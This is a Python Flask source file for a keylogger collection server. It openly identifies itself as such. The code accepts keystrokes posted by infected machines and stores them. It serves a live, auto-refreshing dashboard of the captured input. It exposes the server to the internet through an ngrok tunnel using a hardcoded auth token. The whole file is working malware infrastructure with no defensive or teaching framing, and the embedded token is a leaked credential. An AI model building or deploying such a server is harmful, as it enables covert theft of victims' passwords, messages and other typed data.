# To run this server, you first need to install Flask and pyngrok:
# pip install Flask pyngrok

import sys
import os
import datetime
import subprocess
from flask import Flask, request, jsonify
from pyngrok import ngrok

app = Flask(__name__)
LOG_FILE = "win.txt"
LOG_OUTPUT_FILE = "logs.txt"

def log_output(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S%z")
    with open(LOG_OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(f"t={timestamp} lvl=info msg=\"{message}\"\n")

@app.route('/api/log', methods=['POST'])
def log_keystrokes():
    data = request.get_json(silent=True) or {}
    keystrokes = data.get("keystrokes", "")
    if not isinstance(keystrokes, str):
        return jsonify({"error": "Invalid payload; expected 'keystrokes' string"}), 400

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(keystrokes)
        log_output(f"Received keystrokes: {keystrokes}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        log_output(f"Error logging keystrokes: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/log', methods=['GET'])
def get_keystrokes_html():
    contents = ""
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                contents = f.read()
        except Exception as e:
            contents = f"Error reading log: {e}"
            log_output(f"Error reading keystrokes log: {e}")

    if contents:
        log_display_content = contents.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    else:
        log_display_content = '<span class="muted">No logs yet</span>'

    html_document = f"""
    <!doctype html>
    <html lang="en">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <title>Keystroke Logs</title>
      <style>
        :root {{ color-scheme: dark light; }}
        body {{ font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 0; background: #0b0f17; color: #e5e7eb; }}
        header {{ padding: 16px 20px; border-bottom: 1px solid #1f2937; position: sticky; top: 0; background: #0b0f17; display: flex; align-items: center; gap: 12px; }}
        h1 {{ font-size: 18px; margin: 0; }}
        .meta {{ color: #9ca3af; font-size: 12px; }}
        .container {{ padding: 16px 20px; }}
        .card {{ background: #111827; border: 1px solid #1f2937; border-radius: 10px; overflow: hidden; }}
        .toolbar {{ display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; border-bottom: 1px solid #1f2937; }}
        .btn {{ background: #1f2937; color: #e5e7eb; border: 1px solid #374151; border-radius: 8px; padding: 6px 10px; cursor: pointer; font-size: 12px; }}
        .btn:hover {{ background: #111827; }}
        pre {{ margin: 0; padding: 12px; white-space: pre-wrap; word-break: break-word; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 13px; line-height: 1.4; }}
        .muted {{ color: #6b7280; }}
      </style>
    </head>
    <body>
      <header>
        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01"/></svg>
        <h1>Keystroke Logs</h1>
        <span class="meta" id="status">Connecting…</span>
      </header>
      <div class="container">
        <div class="card">
          <div class="toolbar">
            <div>
              <span class="muted">Auto-refresh</span>
              <span id="lastUpdated" class="muted"></span>
            </div>
            <div>
              <button class="btn" onclick="manualRefresh()">Refresh now</button>
            </div>
          </div>
          <pre id="log">{log_display_content}</pre>
        </div>
      </div>
      <script>
        const statusEl = document.getElementById('status');
        const lastUpdatedEl = document.getElementById('lastUpdated');
        const logEl = document.getElementById('log');

        async function fetchLogs() {{
          try {{
            statusEl.textContent = 'Refreshing…';
            const res = await fetch('/api/log/raw');
            if (!res.ok) throw new Error('HTTP ' + res.status);
            const data = await res.json();
            const text = (data.keystrokes || '').replace(/</g, '&lt;').replace(/>/g, '&gt;');
            logEl.innerHTML = text || '<span class="muted">No logs yet</span>';
            const now = new Date();
            lastUpdatedEl.textContent = ' • Updated ' + now.toLocaleTimeString();
            statusEl.textContent = 'Live';
          }} catch (e) {{
            statusEl.textContent = 'Error';
          }}
        }}

        function manualRefresh() {{ fetchLogs(); }}
        setInterval(fetchLogs, 1000);
        fetchLogs();
      </script>
    </body>
    </html>
    """
    return html_document, 200, {"Content-Type": "text/html; charset=utf-8"}

@app.route('/api/log/raw', methods=['GET'])
def get_keystrokes_raw():
    if not os.path.exists(LOG_FILE):
        return jsonify({"keystrokes": ""}), 200
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            contents = f.read()
        return jsonify({"keystrokes": contents}), 200
    except Exception as e:
        log_output(f"Error reading raw keystrokes: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/')
def home():
    return "Keylogger Server is running. Send POST/GET requests to /api/log."

def run_ngrok(port):
    try:
        authtoken = "2lPr7i9TF0Sm8v47wXaCaq1SwkN_214n8WE8zbjRzKVTrRpB9"
        ngrok.set_auth_token(authtoken)
        public_url = ngrok.connect(port, "http")
        log_output(f"ngrok tunnel is active and available at: {public_url}")
    except Exception as e:
        log_output(f"Error starting ngrok: {e}")

if __name__ == '__main__':
    # Redirect stdout and stderr to the logs.txt file
    sys.stdout = open(LOG_OUTPUT_FILE, "a", encoding="utf-8")
    sys.stderr = open(LOG_OUTPUT_FILE, "a", encoding="utf-8")

    # Set the port the Flask app will run on
    port = 5000

    # Run ngrok in the background
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        import threading
        ngrok_thread = threading.Thread(target=run_ngrok, args=(port,))
        ngrok_thread.daemon = True
        ngrok_thread.start()

    # Start the Flask server
    app.run(host='0.0.0.0', port=port, debug=False)
